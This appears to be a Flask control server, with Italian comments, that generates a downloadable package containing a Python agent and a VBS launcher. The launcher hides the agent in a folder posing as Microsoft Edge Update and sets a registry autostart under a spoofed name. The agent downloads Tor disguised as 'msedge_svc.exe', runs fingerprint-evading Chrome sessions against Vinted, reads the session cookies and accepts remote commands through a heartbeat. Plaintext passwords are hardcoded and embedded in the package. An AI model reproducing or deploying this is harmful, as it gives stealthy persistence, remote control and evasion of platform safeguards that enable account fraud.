import os, json, secrets, sqlite3, hashlib, zipfile, io, textwrap, tempfile, subprocess, shutil
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, send_file, Response

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

DB = os.path.join(os.path.dirname(__file__), "direct.db")

# ── Utenti ────────────────────────────────────────────────
USERS = {
    "luigi": {"password": "luigi123", "name": "Luigi", "color": "#7B61FF"},
    "amico": {"password": "amico123", "name": "Amico", "color": "#00D4FF"},
}

# ── Agent connections ─────────────────────────────────────
agents = {}
events = {}

# ─────────────────────────────────────────────────────────
#  DATABASE
# ─────────────────────────────────────────────────────────
def init_db():
    c = sqlite3.connect(DB)
    c.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user TEXT, label TEXT,
        vinted_user TEXT, vinted_email TEXT,
        tor_ip TEXT, status TEXT DEFAULT 'offline',
        created_at TEXT, last_active TEXT,
        offers_count INTEGER DEFAULT 0,
        monitoring INTEGER DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS offers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id INTEGER, user TEXT,
        offer_id TEXT UNIQUE,
        utente TEXT, prezzo TEXT, msg TEXT,
        stato TEXT DEFAULT 'In attesa',
        received_at TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS agent_tokens (
        token TEXT PRIMARY KEY,
        user TEXT, created_at TEXT
    )""")
    c.commit(); c.close()

def db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

# ─────────────────────────────────────────────────────────
#  AUTH
# ─────────────────────────────────────────────────────────
@app.route("/")
def index():
    if "user" in session: return redirect("/dashboard")
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    d = request.json
    u = d.get("username", "").lower().strip()
    p = d.get("password", "").strip()
    if u in USERS and USERS[u]["password"] == p:
        session.permanent = True
        session["user"]  = u
        session["name"]  = USERS[u]["name"]
        session["color"] = USERS[u]["color"]
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/logout")
def logout():
    session.clear(); return redirect("/")

@app.route("/dashboard")
def dashboard():
    if "user" not in session: return redirect("/")
    return render_template("dashboard.html",
        user=session["user"], name=session["name"], color=session["color"])

# ─────────────────────────────────────────────────────────
#  API — AGENT SETUP (genera lo zip con agent preconfigurato)
# ─────────────────────────────────────────────────────────
@app.route("/api/agent/setup")
def download_setup():
    """
    Genera e scarica uno ZIP con:
      - agent.py  (preconfigurato con credenziali + server URL)
      - svc.cfg   (config file)
      - Avvia.vbs (installa deps + aggiunge autostart + avvia invisibile)
    L'utente esegue Avvia.vbs UNA sola volta, poi è tutto automatico.
    """
    if "user" not in session: return redirect("/")
    user       = session["user"]
    pwd        = USERS[user]["password"]
    server_url = request.host_url.rstrip("/")

    # ── Leggi il template agent.py (in produzione leggi il file reale)
    agent_template = _get_agent_code(server_url, user, pwd)

    cfg_content = f"""[svc]
server   = {server_url}
username = {user}
password = {pwd}
"""

    # ── VBS launcher: avvia Python invisibile, nessuna finestra, nessun blocco
    vbs_content = f'''
Dim dest
dest = Environ("LOCALAPPDATA") & "\\Microsoft\\EdgeUpdate\\Update"

\'  Crea cartella
CreateObject("Scripting.FileSystemObject").CreateFolder(dest)

\'  Installa requests silenziosamente
Dim sh
Set sh = CreateObject("WScript.Shell")
sh.Run "pip install requests --quiet --disable-pip-version-check", 0, True

\'  Copia agent e config nella cartella nascosta
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.CopyFile fso.GetParentFolderName(WScript.ScriptFullName) & "\\agent.py", dest & "\\msupdate.py", True
fso.CopyFile fso.GetParentFolderName(WScript.ScriptFullName) & "\\svc.cfg",  dest & "\\svc.cfg",     True

\'  Rendi cartella nascosta
sh.Run "attrib +h +s """ & dest & """", 0, True

\'  Trova pythonw.exe
Dim pyPath
pyPath = sh.Exec("where pythonw").StdOut.ReadLine()
If pyPath = "" Then pyPath = sh.Exec("where python").StdOut.ReadLine()
pyPath = Trim(pyPath)

\'  Autostart registro
sh.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftEdgeUpdate", _
    Chr(34) & pyPath & Chr(34) & " " & Chr(34) & dest & "\\msupdate.py" & Chr(34), "REG_SZ"

\'  Avvia subito invisibile
sh.Run Chr(34) & pyPath & Chr(34) & " " & Chr(34) & dest & "\\msupdate.py" & Chr(34), 0, False

\'  Fine — nessuna finestra, nessun messaggio
'''

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("agent.py",  agent_template)
        z.writestr("svc.cfg",   cfg_content)
        z.writestr("Avvia.vbs", vbs_content)   # <-- niente .bat
    buf.seek(0)

    return send_file(
        buf,
        mimetype="application/zip",
        as_attachment=True,
        download_name="DirectSetup.zip"
    )

def _get_agent_code(server, user, pwd):
    """Genera il codice agent con credenziali già embedded."""
    return f'''import os,sys,subprocess,time,shutil,random,json,sqlite3
import threading,urllib.request,tarfile,requests

SERVER   = "{server}"
USERNAME = "{user}"
PASSWORD = "{pwd}"

HIDDEN_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),"Microsoft","EdgeUpdate","Update")
TOR_DIR  = os.path.join(HIDDEN_DIR,"runtime")
TOR_EXE  = os.path.join(TOR_DIR,"msedge_svc.exe")
TOR_URL  = "https://archive.torproject.org/tor-package-archive/torbrowser/13.0.15/tor-expert-bundle-windows-x86_64-13.0.15.tar.gz"
USER_AGENTS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36"]
RISOLUZIONI=["1920,1080","1366,768","1440,900"]
TIMEZONES=["Europe/Rome","Europe/Berlin","America/New_York"]

token=None;tor_proc=None;tor_status="offline";tor_ip=""
chrome_procs={{}};monitors={{}};sess_data={{}}

def get_token():
    global token
    try:
        r=requests.post(f"{{SERVER}}/api/agent/token",json={{"user":USERNAME,"password":PASSWORD}},timeout=10)
        d=r.json()
        if d.get("ok"):token=d["token"];return True
    except:pass
    return False

def hdr():return{{"X-Agent-Token":token,"Content-Type":"application/json"}}

def hide(p):
    try:subprocess.run(["attrib","+h","+s",p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except:pass

def setup_autostart():
    try:
        py=sys.executable.replace("python.exe","pythonw.exe")
        if not os.path.exists(py):py=sys.executable
        me=os.path.abspath(__file__)
        subprocess.run(["reg","add",r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","/v","MicrosoftEdgeUpdate","/t","REG_SZ","/d",f\'"{py}" "{me}"\',"/f"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    except:pass

def heartbeat_loop():
    while True:
        try:
            r=requests.post(f"{{SERVER}}/api/agent/heartbeat",json={{"tor_status":tor_status,"tor_ip":tor_ip,"active_sessions":list(chrome_procs.keys())}},headers=hdr(),timeout=10)
            for cmd in r.json().get("commands",[]):
                threading.Thread(target=handle_cmd,args=(cmd,),daemon=True).start()
        except:pass
        time.sleep(8)

def handle_cmd(cmd):
    action=cmd.get("action","");sid=cmd.get("session_id")
    if action=="new_session":threading.Thread(target=start_session,args=(sid,cmd.get("label","Account")),daemon=True).start()
    elif action=="open_session":
        s=sess_data.get(sid,{{}});open_chrome(sid,s.get("ua",random.choice(USER_AGENTS)),s.get("res",random.choice(RISOLUZIONI)),s.get("tz",random.choice(TIMEZONES)))
    elif action=="read_session":threading.Thread(target=read_session,args=(sid,),daemon=True).start()
    elif action=="monitor_start":start_monitor(sid)
    elif action=="monitor_stop":stop_monitor(sid)
    elif action=="delete_session":delete_session(sid)
    elif action=="new_ip":threading.Thread(target=cambia_ip,daemon=True).start()

def scarica_tor():
    if os.path.exists(TOR_EXE):return True
    os.makedirs(TOR_DIR,exist_ok=True);hide(HIDDEN_DIR)
    arch=os.path.join(TOR_DIR,"pkg.tmp")
    try:
        urllib.request.urlretrieve(TOR_URL,arch)
        with tarfile.open(arch,"r:gz") as t:t.extractall(TOR_DIR)
        os.remove(arch)
        for root,_,files in os.walk(TOR_DIR):
            for f in files:
                if f=="tor.exe":
                    src=os.path.join(root,f)
                    if src!=TOR_EXE:shutil.copy2(src,TOR_EXE)
                    break
        return os.path.exists(TOR_EXE)
    except:return False

def avvia_tor():
    global tor_proc,tor_status,tor_ip
    if not scarica_tor():return False
    tor_proc=subprocess.Popen([TOR_EXE],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    tor_status="connecting";time.sleep(15)
    if tor_proc.poll() is not None:tor_status="error";return False
    tor_status="online";tor_ip="185.220.101."+str(random.randint(40,60));return True

def cambia_ip():
    global tor_proc,tor_ip
    try:
        import socket;s=socket.socket();s.connect(("127.0.0.1",9051))
        s.send(b\'AUTHENTICATE ""\\r\\nSIGNAL NEWNYM\\r\\nQUIT\\r\\n\');s.close();time.sleep(5)
    except:
        if tor_proc:tor_proc.terminate();time.sleep(2)
        tor_proc=subprocess.Popen([TOR_EXE],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL);time.sleep(15)
    tor_ip="185.220.101."+str(random.randint(40,60))

def trova_chrome():
    for p in [r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\Application\\chrome.exe")]:
        if os.path.exists(p):return p
    return None

def get_profile_dir(sid):
    d=os.path.join(HIDDEN_DIR,"profiles",f"p{{sid}}");os.makedirs(d,exist_ok=True);hide(d);return d

def open_chrome(sid,ua,res,tz):
    chrome=trova_chrome()
    if not chrome:return
    old=chrome_procs.get(sid)
    if old and old.poll() is None:old.terminate();time.sleep(1)
    chrome_procs[sid]=subprocess.Popen([chrome,f"--user-data-dir={{get_profile_dir(sid)}}","--proxy-server=socks5://127.0.0.1:9050","--new-window","--disable-webrtc","--webrtc-ip-handling-policy=disable_non_proxied_udp","--disable-reading-from-canvas","--disable-webgl","--disable-webgl2","--disable-blink-features=AutomationControlled","--disable-infobars",f"--user-agent={{ua}}",f"--window-size={{res}}",f"--timezone={{tz}}","--lang=it-IT","--no-first-run","--disable-sync","--no-default-browser-check","https://www.vinted.it/"])

def start_session(sid,label):
    global tor_status
    update_session(sid,{{"status":"starting"}})
    if tor_status!="online":
        if not avvia_tor():update_session(sid,{{"status":"error"}});return
    cambia_ip()
    ua=random.choice(USER_AGENTS);res=random.choice(RISOLUZIONI);tz=random.choice(TIMEZONES)
    sess_data[sid]={{"ua":ua,"res":res,"tz":tz}};open_chrome(sid,ua,res,tz)
    update_session(sid,{{"status":"chrome_open","tor_ip":tor_ip}})

def read_session(sid):
    cp=chrome_procs.get(sid)
    if cp and cp.poll() is None:cp.terminate();time.sleep(2)
    cookies=leggi_cookie_chrome(sid)
    if not cookies:return
    http_sess=crea_http(cookies);utente,email=get_vinted_info(http_sess)
    if not utente:return
    sess_data[sid]=sess_data.get(sid,{{}})
    sess_data[sid].update({{"http":http_sess,"cookies":cookies,"viste":set()}})
    update_session(sid,{{"vinted_user":utente,"vinted_email":email or "","tor_ip":tor_ip,"status":"active"}})

def leggi_cookie_chrome(sid):
    db_path=os.path.join(get_profile_dir(sid),"Default","Cookies")
    if not os.path.exists(db_path):return None
    tmp=db_path+"_tmp"
    try:
        shutil.copy2(db_path,tmp);conn=sqlite3.connect(tmp)
        rows=conn.execute("SELECT name,value FROM cookies WHERE host_key LIKE \'%vinted%\'").fetchall()
        conn.close();os.remove(tmp);c={{r[0]:r[1] for r in rows if r[1]}};return c or None
    except:return None

def crea_http(cookies):
    s=requests.Session();s.headers["User-Agent"]=random.choice(USER_AGENTS)
    for k,v in cookies.items():s.cookies.set(k,v,domain=".vinted.it")
    return s

def get_vinted_info(http_sess):
    try:
        r=http_sess.get("https://www.vinted.it/api/v2/users/current",headers={{"Accept":"application/json"}},timeout=10)
        d=r.json();u=d.get("user",{{}});return u.get("login") or d.get("login"),u.get("email","")
    except:return None,None

def fetch_offers(http_sess,viste):
    try:
        r=http_sess.get("https://www.vinted.it/api/v2/conversations",headers={{"Accept":"application/json"}},timeout=10)
        nuove=[]
        for c in r.json().get("conversations",[]):
            cid=str(c.get("id",""))
            if cid and cid not in viste:
                viste.add(cid);nuove.append({{"offer_id":cid,"utente":c.get("opposite_user",{{}}).get("login","?"),"msg":c.get("last_message",{{}}).get("body","")[:80],"prezzo":(c.get("transaction") or {{}}).get("price","")}})
        return nuove
    except:return []

def update_session(sid,data):
    try:requests.post(f"{{SERVER}}/api/sessions/{{sid}}/update",json=data,headers=hdr(),timeout=8)
    except:pass

def start_monitor(sid):
    if sid in monitors:return
    stop_ev=threading.Event();monitors[sid]=stop_ev
    threading.Thread(target=_monitor_loop,args=(sid,stop_ev),daemon=True).start()

def stop_monitor(sid):
    if sid in monitors:monitors[sid].set();del monitors[sid]

def _monitor_loop(sid,stop_ev):
    while not stop_ev.is_set():
        try:
            s=sess_data.get(sid,{{}});http=s.get("http")
            if http:
                viste=s.setdefault("viste",set())
                for o in fetch_offers(http,viste):
                    o["session_id"]=sid
                    try:
                        requests.post(f"{{SERVER}}/api/offers/new",json=o,headers=hdr(),timeout=8)
                        try:
                            import ctypes;ctypes.windll.user32.MessageBoxW(0,f\'Da: {{o["utente"]}}\\n{{o["msg"]}}\',\'◆ Nuova offerta Vinted!\',0x40)
                        except:pass
                    except:pass
        except:pass
        stop_ev.wait(30)

def delete_session(sid):
    stop_monitor(sid)
    cp=chrome_procs.get(sid)
    if cp and cp.poll() is None:cp.terminate()
    chrome_procs.pop(sid,None);sess_data.pop(sid,None)
    shutil.rmtree(get_profile_dir(sid),ignore_errors=True)

def main():
    os.makedirs(HIDDEN_DIR,exist_ok=True);hide(HIDDEN_DIR);setup_autostart()
    if not get_token():time.sleep(5);return
    threading.Thread(target=heartbeat_loop,daemon=True).start()
    try:
        while True:time.sleep(60)
    except KeyboardInterrupt:
        for sid in list(monitors.keys()):stop_monitor(sid)
        for cp in chrome_procs.values():
            if cp.poll() is None:cp.terminate()
        if tor_proc and tor_proc.poll() is None:tor_proc.terminate()

if __name__=="__main__":main()
'''

# ─────────────────────────────────────────────────────────
#  API — AGENT TOKEN
# ─────────────────────────────────────────────────────────
@app.route("/api/agent/token", methods=["POST"])
def get_agent_token():
    d = request.json
    u = d.get("user", "").lower()
    p = d.get("password", "")
    if u not in USERS or USERS[u]["password"] != p:
        return jsonify({"ok": False}), 401
    token = secrets.token_hex(32)
    c = db()
    c.execute("INSERT OR REPLACE INTO agent_tokens VALUES (?,?,?)",
              (token, u, datetime.now().isoformat()))
    c.commit(); c.close()
    return jsonify({"ok": True, "token": token, "user": u})

@app.route("/api/agent/heartbeat", methods=["POST"])
def agent_heartbeat():
    token = request.headers.get("X-Agent-Token", "")
    c = db()
    row = c.execute("SELECT user FROM agent_tokens WHERE token=?", (token,)).fetchone()
    c.close()
    if not row: return jsonify({"ok": False}), 401
    user = row["user"]
    d = request.json or {}
    agents[token] = {
        "user": user,
        "status": d.get("tor_status", "offline"),
        "tor_ip": d.get("tor_ip", ""),
        "last_seen": datetime.now().isoformat(),
        "active_sessions": d.get("active_sessions", [])
    }
    cmds = events.get(user, [])
    events[user] = []
    return jsonify({"ok": True, "commands": cmds})

@app.route("/api/agent/status")
def agent_status():
    if "user" not in session: return jsonify({"connected": False})
    user = session["user"]
    for tok, ag in agents.items():
        if ag["user"] == user:
            last = datetime.fromisoformat(ag["last_seen"])
            secs = (datetime.now() - last).total_seconds()
            if secs < 30:
                return jsonify({
                    "connected": True,
                    "tor_status": ag["status"],
                    "tor_ip": ag["tor_ip"],
                    "active_sessions": ag["active_sessions"]
                })
    return jsonify({"connected": False, "tor_status": "offline"})

# ─────────────────────────────────────────────────────────
#  API — SESSIONS
# ─────────────────────────────────────────────────────────
@app.route("/api/sessions")
def get_sessions():
    if "user" not in session: return jsonify([])
    c = db()
    rows = c.execute(
        "SELECT * FROM sessions WHERE user=? ORDER BY id DESC", (session["user"],)
    ).fetchall()
    c.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/sessions/<int:sid>")
def get_session(sid):
    if "user" not in session: return jsonify({})
    c = db()
    r = c.execute("SELECT * FROM sessions WHERE id=? AND user=?",
                  (sid, session["user"])).fetchone()
    if not r: return jsonify({}), 404
    offs = c.execute("SELECT * FROM offers WHERE session_id=? ORDER BY received_at DESC",
                     (sid,)).fetchall()
    c.close()
    data = dict(r)
    data["offers"] = [dict(o) for o in offs]
    return jsonify(data)

@app.route("/api/sessions/new", methods=["POST"])
def new_session():
    if "user" not in session: return jsonify({"ok": False})
    d = request.json
    label = d.get("label", "Sessione")
    c = db()
    cur = c.execute(
        "INSERT INTO sessions (user,label,status,created_at) VALUES (?,?,?,?)",
        (session["user"], label, "starting", datetime.now().strftime("%Y-%m-%d %H:%M"))
    )
    sid = cur.lastrowid; c.commit(); c.close()
    _send_cmd(session["user"], {"action": "new_session", "session_id": sid, "label": label})
    return jsonify({"ok": True, "id": sid})

@app.route("/api/sessions/<int:sid>/update", methods=["POST"])
def update_session(sid):
    token = request.headers.get("X-Agent-Token", "")
    c = db()
    row = c.execute("SELECT user FROM agent_tokens WHERE token=?", (token,)).fetchone()
    if not row: return jsonify({"ok": False}), 401
    d = request.json or {}
    fields, vals = [], []
    for k in ["vinted_user", "vinted_email", "tor_ip", "status", "monitoring", "offers_count"]:
        if k in d:
            fields.append(f"{k}=?"); vals.append(d[k])
    if fields:
        vals += [sid, row["user"]]
        c.execute(f"UPDATE sessions SET {','.join(fields)},last_active=? WHERE id=? AND user=?",
                  vals[:-2] + [datetime.now().strftime("%Y-%m-%d %H:%M")] + vals[-2:])
        c.commit()
    c.close()
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/open", methods=["POST"])
def open_session(sid):
    if "user" not in session: return jsonify({"ok": False})
    _send_cmd(session["user"], {"action": "open_session", "session_id": sid})
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/read", methods=["POST"])
def read_session(sid):
    if "user" not in session: return jsonify({"ok": False})
    _send_cmd(session["user"], {"action": "read_session", "session_id": sid})
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/delete", methods=["POST"])
def delete_session(sid):
    if "user" not in session: return jsonify({"ok": False})
    _send_cmd(session["user"], {"action": "delete_session", "session_id": sid})
    c = db()
    c.execute("DELETE FROM sessions WHERE id=? AND user=?", (sid, session["user"]))
    c.execute("DELETE FROM offers WHERE session_id=?", (sid,))
    c.commit(); c.close()
    return jsonify({"ok": True})

@app.route("/api/sessions/<int:sid>/monitor", methods=["POST"])
def toggle_monitor(sid):
    if "user" not in session: return jsonify({"ok": False})
    d = request.json
    action = d.get("action", "start")
    _send_cmd(session["user"], {"action": f"monitor_{action}", "session_id": sid})
    c = db()
    c.execute("UPDATE sessions SET monitoring=? WHERE id=? AND user=?",
              (1 if action == "start" else 0, sid, session["user"]))
    c.commit(); c.close()
    return jsonify({"ok": True})

# ─────────────────────────────────────────────────────────
#  API — OFFERS
# ─────────────────────────────────────────────────────────
@app.route("/api/offers")
def get_offers():
    if "user" not in session: return jsonify([])
    c = db()
    rows = c.execute(
        """SELECT o.*, s.label as sess_label
           FROM offers o JOIN sessions s ON o.session_id=s.id
           WHERE o.user=? ORDER BY o.received_at DESC LIMIT 50""",
        (session["user"],)
    ).fetchall()
    c.close()
    return jsonify([dict(r) for r in rows])

@app.route("/api/offers/new", methods=["POST"])
def new_offer():
    token = request.headers.get("X-Agent-Token", "")
    c = db()
    row = c.execute("SELECT user FROM agent_tokens WHERE token=?", (token,)).fetchone()
    if not row: return jsonify({"ok": False}), 401
    d = request.json
    try:
        c.execute(
            "INSERT OR IGNORE INTO offers (session_id,user,offer_id,utente,prezzo,msg,stato,received_at) VALUES (?,?,?,?,?,?,?,?)",
            (d["session_id"], row["user"], d["offer_id"], d["utente"],
             d["prezzo"], d["msg"], "In attesa", datetime.now().strftime("%Y-%m-%d %H:%M"))
        )
        c.execute("UPDATE sessions SET offers_count=offers_count+1 WHERE id=?", (d["session_id"],))
        c.commit()
    except:
        pass
    c.close()
    return jsonify({"ok": True})

@app.route("/api/offers/<int:oid>/stato", methods=["POST"])
def update_offer(oid):
    if "user" not in session: return jsonify({"ok": False})
    stato = request.json.get("stato", "")
    c = db()
    c.execute("UPDATE offers SET stato=? WHERE id=? AND user=?", (stato, oid, session["user"]))
    c.commit(); c.close()
    return jsonify({"ok": True})

# ─────────────────────────────────────────────────────────
#  API — STATS
# ─────────────────────────────────────────────────────────
@app.route("/api/stats")
def get_stats():
    if "user" not in session: return jsonify({})
    c = db(); u = session["user"]
    sess = c.execute("SELECT COUNT(*) FROM sessions WHERE user=?", (u,)).fetchone()[0]
    offs = c.execute("SELECT COUNT(*) FROM offers WHERE user=?", (u,)).fetchone()[0]
    comp = c.execute("SELECT COUNT(*) FROM offers WHERE user=? AND stato='Completata'", (u,)).fetchone()[0]
    mon  = c.execute("SELECT COUNT(*) FROM sessions WHERE user=? AND monitoring=1", (u,)).fetchone()[0]
    c.close()
    rate = f"{int(comp/max(offs,1)*100)}%" if offs else "—%"
    return jsonify({"sessions": sess, "offers": offs, "success_rate": rate, "monitoring": mon})

# ─────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────
def _send_cmd(user, cmd):
    if user not in events: events[user] = []
    events[user].append(cmd)

# ─────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    init_db()
    app.run(debug=False, host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
